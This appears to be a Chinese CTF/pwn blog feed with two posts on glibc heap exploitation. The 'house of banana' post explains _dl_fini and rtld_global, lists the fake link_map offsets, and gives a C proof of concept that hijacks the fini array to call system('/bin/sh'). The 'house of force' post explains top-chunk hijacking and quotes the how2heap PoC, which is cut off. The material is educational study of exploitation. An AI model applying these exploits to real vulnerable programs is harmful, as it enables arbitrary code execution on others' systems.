class="line">_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">  DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">  ns);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">    / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    ((<span class="keyword">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">DL_CALL_DT_FINI</span><br><span class="line">  (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">    &#125;</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure><p>可以看到最后调用了array[i]()，不过我们需要控制array的话就需要进一步知道这是什么。</p><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">    <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">    &#123;</span><br><span class="line">        assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">        maps[i] = l;</span><br><span class="line">        l-&gt;l_idx = i;</span><br><span class="line">        ++i;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">        ++l-&gt;l_direct_opencount;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到下面的其实是和这一部分有关的</p><p>其中的GL就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> GL(name) _rtld_global._##name</span></span><br></pre></td></tr></table></figure><p>下面就是_rtld_global这个结构体，但是这个结构体相对比较复杂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;</span></span><br><span class="line"><span class="comment">     must remain the first element.  Forever.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Non-shared code has no support for multiple namespaces.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> DL_NNS 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> DL_NNS 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  EXTERN <span class="class"><span class="keyword">struct</span> <span class="title">link_namespaces</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* A pointer to the map for the main map.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *_<span class="title">ns_loaded</span>;</span></span><br><span class="line">    <span class="comment">/* Number of object in the _dl_loaded list.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> _ns_nloaded;</span><br><span class="line">    <span class="comment">/* Direct pointer to the searchlist of the main object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *_<span class="title">ns_main_searchlist</span>;</span></span><br><span class="line">    <span class="comment">/* This is zero at program start to signal that the global scope map is</span></span><br><span class="line"><span class="comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span></span><br><span class="line"><span class="comment">       reset if in _dl_close if the last global object is removed.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* During dlopen, this is the number of objects that still need to</span></span><br><span class="line"><span class="comment">       be added to the global scope map.  It has to be taken into</span></span><br><span class="line"><span class="comment">       account when resizing the map, for future map additions after</span></span><br><span class="line"><span class="comment">       recursive dlopen calls from ELF constructors.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> _ns_global_scope_pending_adds;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search table for unique objects.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym_table</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      __rtld_lock_define_recursive (, lock)</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="keyword">uint32_t</span> hashval;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">      &#125; *entries;</span><br><span class="line">      <span class="keyword">size_t</span> size;</span><br><span class="line">      <span class="keyword">size_t</span> n_elements;</span><br><span class="line">      <span class="keyword">void</span> (*<span class="built_in">free</span>) (<span class="keyword">void</span> *);</span><br><span class="line">    &#125; _ns_unique_sym_table;</span><br><span class="line">    <span class="comment">/* Keep track of changes to each namespace&#x27; list.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_debug</span> _<span class="title">ns_debug</span>;</span></span><br><span class="line">  &#125; _dl_ns[DL_NNS];</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure><p>通过上面的for循环可以看到其实我们利用的也只是其中的dl_ns部分，所以下面的我就省略了。然后其中又是另一个结构体这里就不继续深挖了。</p><p>这里根据上面的内容可以看出来的是 <code>array = (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY\]-&gt;d_un.d_ptr);</code></p><p>再根据上面的for循环最后使用的是<code>l=l-&gt;next</code>可以看出来其实这是一个存在链表操作的结构，所以我们只需要伪造链表当中的其中一个结构体就行。</p><p>再次看到这个赋值操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">    <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">    &#123;</span><br><span class="line">        assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">        maps[i] = l;</span><br><span class="line">        l-&gt;l_idx = i;</span><br><span class="line">        ++i;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">        ++l-&gt;l_direct_opencount;</span><br><span class="line">    &#125;</span><br><span class="line">assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>这里的maps需要的是4个元素，所以我们劫持第三个l-&gt;next到我们伪造的结构当中即可，并且可以绕过下面两个assert</p><p><img src="/images/image-20220307134013740.png" alt="image-20220307134013740"></p><p>所以我们利用distance求出偏移然后修改掉&amp;_rtld_global-0x1e048的地址到我们伪造的结构体就行，另外在这一代码当中存在一个if判断，需要绕过这一if判断</p><p><img src="/images/image-20220307134759927.png" alt="image-20220307134759927"></p><p><img src="/images/image-20220307134820512.png" alt="image-20220307134820512"></p><p>所以我们只需要在fake+0x28=fake就可</p><p>现在的目标就是进行伪造，能够顺利的执行到最后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">    l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">    <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">        || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">                              &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">            _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">                              DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">                              ns);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">                (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">                                + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                              / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">            <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">                ((<span class="keyword">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>可以看到这里存在的是三个if判断</p><p><img src="/images/image-20220307135557831.png" alt="image-20220307135557831"></p><p>首先是l_init_called可以看到他们之间的距离为0x314然后地址上的值为0x1c，所以只需要fake+0x314=0x1c即可绕过。(在glibc2.31当中的距离为0x31c，上面没注意使用的是glibc2.27下面改用2.31)</p><p>随后就是下面两个if语句，fake-&gt;l_info[26]和fake-&gt;l_info[28]!=NULL即可绕过，然后可以看到下面这两个其实直接控制了，array和i的值，所以我们需要利用好这两个。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">    / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">------</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>DT_FINI_ARRAY26<span class="comment">/* Array with addresses of fini fct */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>DT_FINI_ARRAYSZ28<span class="comment">/* Size in bytes of DT_FINI_ARRAY */</span></span></span><br></pre></td></tr></table></figure><p><img src="/images/image-20220307171529724.png" alt="image-20220307171529724"></p><p><img src="/images/image-20220307171150261.png" alt="image-20220307171150261"></p><p>查看info的结构体，这里的伪造方式我直接引用我参考的博客来写</p><p>在fake+0x110处写入fake+0x40，然后在fake+0x48写入fake+0x58然后在fake+0x58写入shell</p><p>在fake+0x120出写入fake+0x48，在fake+0x50处写入8</p><h3 id="总结利用方式"><a href="#总结利用方式" class="headerlink" title="总结利用方式"></a>总结利用方式</h3><p>首先劫持结构体：</p><p>​    <code>&amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next) = fake</code></p><p>绕过检测：</p><p>​    <code>fake+0x28 = fake</code></p><p>​    <code>fake+0x31c = 0x1c</code></p><p>控制array：</p><p>​    <code>fake+0x110 = fake+0x40</code></p><p>​    <code>fake+0x48 = fake+0x58</code></p><p>​    <code>fake+0x58 = shell</code></p><p>控制i：</p><p>​    <code>fake+0x120 = fake+0x48</code></p><p>​    <code>fake+0x50 = 8</code></p><p><strong>需要注意的</strong></p><p>上面说的maps需要四个元素，然后我懒得调试就没在glibc2.31下调试，所以就直接写poc但是存在问题，后面调试发现其实需要的是7个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br></pre></td></tr></table></figure><p>所以如果是在glibc2.31下我们劫持结构体的方式应该变为：</p><p>​    <code>&amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next-&gt;l_next-&gt;l_next-&gt;l_next) = fake</code></p><p>后续的内容一致</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>下面是我自己写的poc，我将large bin attack的步骤省略了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> *target;</span><br><span class="line">    <span class="keyword">uint64_t</span> *fake;</span><br><span class="line">    <span class="keyword">uint64_t</span> main_arena_96;</span><br><span class="line">    <span class="keyword">uint64_t</span> *rtld_global_addr;</span><br><span class="line"></span><br><span class="line">    fake = (<span class="keyword">uint64_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(fake);</span><br><span class="line">    main_arena_96 = *(<span class="keyword">uint64_t</span> *)fake;</span><br><span class="line">    rtld_global_addr = (<span class="keyword">uint64_t</span> *)main_arena_96 + (<span class="number">0x259480</span> / <span class="number">8</span>);</span><br><span class="line">    target = (<span class="keyword">uint64_t</span> *)rtld_global_addr - <span class="number">0x4b128</span> / <span class="number">8</span>;</span><br><span class="line">    fake = (<span class="keyword">uint64_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">void</span> *)fake, <span class="number">0</span>, <span class="number">0x420</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)target = (<span class="keyword">uint64_t</span>)fake;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake + <span class="number">0x28</span> / <span class="number">8</span>) = fake;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake + <span class="number">0x31c</span> / <span class="number">8</span>) = <span class="number">0x1c00000000</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake + <span class="number">0x110</span> / <span class="number">8</span>) = fake + <span class="number">0x40</span> / <span class="number">8</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake + <span class="number">0x48</span> / <span class="number">8</span>) = fake + <span class="number">0x58</span> / <span class="number">8</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake + <span class="number">0x58</span> / <span class="number">8</span>) = (<span class="keyword">uint64_t</span>)shell;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake + <span class="number">0x120</span> / <span class="number">8</span>) = fake + <span class="number">0x48</span> / <span class="number">8</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake + <span class="number">0x50</span> / <span class="number">8</span>) = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a class="link"   href="https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" >https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/<i class="fas fa-external-link-alt"></i></a></p><p>大佬这里最后的poc在除了上面我说的之外存在还一点小问题，应该是忘了给每个地址除以8</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;这个堆利用方式相较于以往的利用方式存在利用目标的不同，这一方式的利用我感觉比较适合与glibc2.31之后，比较之前都可以直接用FSOP，但是在2.31之后FSOP的利用方式就是house of pig不过如果题目禁止了__free_hook之类的</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="house系列" scheme="https://cv196082.gitee.io/tags/house%E7%B3%BB%E5%88%97/"/>
    
    <category term="fini" scheme="https://cv196082.gitee.io/tags/fini/"/>
    
    <category term="house of banana" scheme="https://cv196082.gitee.io/tags/house-of-banana/"/>
    
  </entry>
  
  <entry>
    <title>house of ******</title>
    <link href="https://cv196082.gitee.io/2022/03/03/house-of/"/>
    <id>https://cv196082.gitee.io/2022/03/03/house-of/</id>
    <published>2022-03-03T09:32:44.000Z</published>
    <updated>2022-03-07T04:54:05.992Z</updated>
    
    <content type="html"><![CDATA[<p>没错！标题的星号就是脏字！</p><h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h2><p>这个堆利用的方式是控制top chunk，把top chunk跑到任意位置。</p><p>总所周知，在malloc的时候发现bin当中没有合适size的chunk的时候就去会割top chunk，那么是怎么隔的就看一下源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure><p>通过上面两个片段就很好可以看出来，只要我们top chunk的size大于我们申请的就会进入内部，然后注意<code>remainder = chunk_at_offset (victim, nb);</code>也就是当前的top chunk的地址加上申请的size，下面<code>av-&gt;top = remainder;</code>将地址赋值给top chunk，不过这里的问题则是如果我们后面给到一个负值，那么我们的top chunk就可以跑到任意地方了。所以来看看how2heap的poc：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This PoC works also with ASLR enabled.</span></span><br><span class="line"><span class="comment">   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.</span></span><br><span class="line"><span class="comment">   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum </span></span><br><span class="line"><span class="comment">   ( http://phrack.org/issues/66/10.html )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bss_var[] = <span class="string">&quot;This is a string that we want to overwrite.&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Force\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span 